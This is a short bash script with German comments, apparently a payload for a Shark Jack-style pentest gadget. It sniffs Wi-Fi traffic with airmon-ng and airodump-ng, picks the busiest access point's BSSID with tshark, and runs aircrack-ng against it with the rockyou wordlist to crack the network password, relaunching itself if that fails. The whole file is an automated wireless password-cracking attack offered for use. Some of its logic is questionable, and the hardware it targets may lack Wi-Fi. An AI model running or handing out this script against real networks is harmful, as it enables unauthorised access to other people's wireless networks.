#!/bin/bash

# Setze die LED auf blau blinkend
LED blink_blue

# Starte das Sniffing
airmon-ng start wlan0
airodump-ng -w capture --output-format pcap --write-interval 1 wlan0mon & PID=$!
sleep 15m

# Überprüfe, ob das Sniffing erfolgreich war
if pgrep "airodump-ng" >/dev/null; then
    # Beende das Sniffing
    kill -9 $PID
    airmon-ng stop wlan0mon

    # Setze die LED auf grün
    LED green

    # Ermittle die BSSID des Netzwerks
    BSSID=$(tshark -r capture-01.cap -T fields -e wlan.bssid -Y wlan.fc.type_subtype==0x08 | sort | uniq -c | sort -rn | head -1 | awk '{print $2}')

    # Überprüfe das Passwort auf Korrektheit
    if [ -n "$BSSID" ]; then
        aircrack-ng -w /usr/share/wordlists/rockyou.txt -b "$BSSID" capture-01.cap
        if [ $? -eq 0 ]; then
            # Setze die LED auf grün
            LED green
        else
            # Starte das Sniffing erneut
            LED blink_yellow
            ./SharkJack_sniff.sh
        fi
    else
        # Starte das Sniffing erneut
        LED blink_yellow
        ./SharkJack_sniff.sh
    fi
else
    # Setze die LED auf rot
    LED red
fi
